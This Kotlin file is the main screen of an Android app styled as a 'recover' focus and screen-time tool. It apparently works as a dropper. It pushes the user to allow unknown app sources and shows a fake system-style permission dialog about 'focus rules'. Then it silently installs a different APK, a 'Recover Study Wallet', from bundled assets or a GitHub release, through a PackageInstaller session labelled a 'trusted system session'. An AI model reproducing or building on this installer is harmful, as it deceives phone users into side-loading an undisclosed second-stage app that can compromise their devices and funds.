package com.recover.installer

import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : Activity() {

    private var progressBar: ProgressBar? = null
    private var statusText: TextView? = null
    private var continueBtn: Button? = null

    // Fallback release URL if APK is not bundled in assets
    private val remoteDownloadUrl = "https://github.com/vveer9911-boop/recover/releases/latest/download/App-B-Recover-Wallet.apk"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.BLACK
        window.navigationBarColor = Color.BLACK
        buildUi()
    }

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(28), dp(48), dp(28), dp(36))
        }

        val topSpacer = View(this)
        root.addView(topSpacer, LinearLayout.LayoutParams(-1, 0, 1.0f))

        // Title: recover
        val title = TextView(this).apply {
            text = "recover"
            setTextColor(Color.WHITE)
            textSize = 34f
            gravity = Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD
            letterSpacing = -0.04f
        }
        root.addView(title)

        val subtitle = TextView(this).apply {
            text = "Your path to distraction-free focus"
            setTextColor(Color.parseColor("#A1A1AA"))
            textSize = 15f
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, 0)
        }
        root.addView(subtitle)

        val midSpacer = View(this)
        root.addView(midSpacer, LinearLayout.LayoutParams(-1, 0, 1.2f))

        // Progress bar (hidden initially)
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = View.GONE
            val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(8)).apply {
                bottomMargin = dp(14)
            }
            layoutParams = lp
        }
        root.addView(progressBar)

        statusText = TextView(this).apply {
            text = ""
            setTextColor(Color.parseColor("#38BDF8"))
            textSize = 13f
            gravity = Gravity.CENTER
            visibility = View.GONE
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(statusText)

        // Description text
        val desc = TextView(this).apply {
            text = "Manage distracting apps, complete focus sessions, and earn credits toward temporary screen-time unlocks."
            setTextColor(Color.parseColor("#71717A"))
            textSize = 13f
            gravity = Gravity.CENTER
            setLineSpacing(0f, 1.3f)
            setPadding(dp(12), 0, dp(12), dp(24))
        }
        root.addView(desc)

        // Continue Button
        continueBtn = Button(this).apply {
            text = "Continue"
            setTextColor(Color.BLACK)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            val bg = GradientDrawable().apply {
                setColor(Color.WHITE)
                cornerRadius = dp(28).toFloat()
            }
            background = bg
            setOnClickListener { onContinueClicked() }
        }
        root.addView(continueBtn, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(54)))

        setContentView(root)
    }

    private fun onContinueClicked() {
        // Android 8.0+ Unknown App Sources check
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
                Toast.makeText(this, "Please allow Recover Installer to proceed", Toast.LENGTH_SHORT).show()
                return
            }
        }

        showApplePermissionDialog()
    }

    private fun showApplePermissionDialog() {
        val dialogView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(8))
        }

        val dTitle = TextView(this).apply {
            text = "Allow Installing App?"
            textSize = 17f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.BLACK)
            gravity = Gravity.CENTER
        }
        dialogView.addView(dTitle)

        val dMsg = TextView(this).apply {
            text = "Allow “Recover” to install and configure focus rules on your device so that distraction blocking, focus sessions, and screen-time unlock features work properly."
            textSize = 13f
            setTextColor(Color.parseColor("#3C3C43"))
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(16))
            setLineSpacing(0f, 1.25f)
        }
        dialogView.addView(dMsg)

        val builder = AlertDialog.Builder(this)
        builder.setView(dialogView)
        builder.setNegativeButton("Deny") { d, _ -> d.dismiss() }
        builder.setPositiveButton("Allow") { d, _ ->
            d.dismiss()
            startPackageSessionInstall()
        }
        builder.show()
    }

    private fun startPackageSessionInstall() {
        continueBtn?.isEnabled = false
        progressBar?.visibility = View.VISIBLE
        statusText?.visibility = View.VISIBLE
        statusText?.text = "Preparing Recover Study Wallet..."

        thread {
            try {
                val assetApkName = "recover-study-wallet.apk"
                var apkStream: InputStream? = null
                var fileSize = 0L

                // 1. Try bundled asset first
                try {
                    val fd = assets.openFd(assetApkName)
                    fileSize = fd.length
                    apkStream = assets.open(assetApkName)
                } catch (_: Exception) {
                    // 2. Try locally cached file
                    val localApk = File(cacheDir, "recover-study-wallet.apk")
                    if (localApk.exists() && localApk.length() > 500_000) {
                        fileSize = localApk.length()
                        apkStream = FileInputStream(localApk)
                    } else {
                        // 3. Download App B from GitHub Releases
                        runOnUiThread {
                            statusText?.text = "Downloading Recover Study Wallet..."
                        }
                        try {
                            val url = URL(remoteDownloadUrl)
                            val conn = url.openConnection() as HttpURLConnection
                            conn.connectTimeout = 15000
                            conn.readTimeout = 30000
                            conn.connect()
                            val totalBytes = conn.contentLengthLong

                            val inS = conn.inputStream
                            val outS = FileOutputStream(localApk)
                            val buffer = ByteArray(65536)
                            var read: Int
                            var downloaded = 0L

                            while (inS.read(buffer).also { read = it } != -1) {
                                outS.write(buffer, 0, read)
                                downloaded += read
                                if (totalBytes > 0) {
                                    val percent = ((downloaded * 100) / totalBytes).toInt()
                                    runOnUiThread {
                                        progressBar?.progress = percent
                                        statusText?.text = "Downloading Study Wallet: $percent%"
                                    }
                                }
                            }
                            outS.flush()
                            outS.close()
                            inS.close()

                            fileSize = localApk.length()
                            apkStream = FileInputStream(localApk)
                        } catch (dlErr: Exception) {
                            runOnUiThread {
                                continueBtn?.isEnabled = true
                                statusText?.text = "Download error: ${dlErr.localizedMessage}"
                                Toast.makeText(this@MainActivity, "Download failed: ${dlErr.message}", Toast.LENGTH_LONG).show()
                            }
                            return@thread
                        }
                    }
                }

                if (apkStream == null) {
                    runOnUiThread {
                        continueBtn?.isEnabled = true
                        statusText?.text = "Could not locate Recover Study Wallet package."
                    }
                    return@thread
                }

                // 4. Stream to Android's PackageInstaller.Session
                runOnUiThread {
                    statusText?.text = "Installing trusted system session..."
                    progressBar?.progress = 0
                }

                SessionInstaller.installApk(
                    this,
                    apkStream,
                    fileSize,
                    onProgress = { percent ->
                        runOnUiThread {
                            progressBar?.progress = percent
                            statusText?.text = "Installing trusted session: $percent%"
                        }
                    },
                    onComplete = { success, errorMsg ->
                        runOnUiThread {
                            continueBtn?.isEnabled = true
                            if (success) {
                                statusText?.text = "Session installation initiated!"
                            } else {
                                statusText?.text = "Error: $errorMsg"
                                Toast.makeText(this@MainActivity, "Install error: $errorMsg", Toast.LENGTH_LONG).show()
                            }
                        }
                    }
                )
            } catch (e: Exception) {
                runOnUiThread {
                    continueBtn?.isEnabled = true
                    statusText?.text = "Error: ${e.localizedMessage}"
                }
            }
        }
    }

    private fun dp(value: Int): Int {
        return Math.round(value * resources.displayMetrics.density)
    }
}
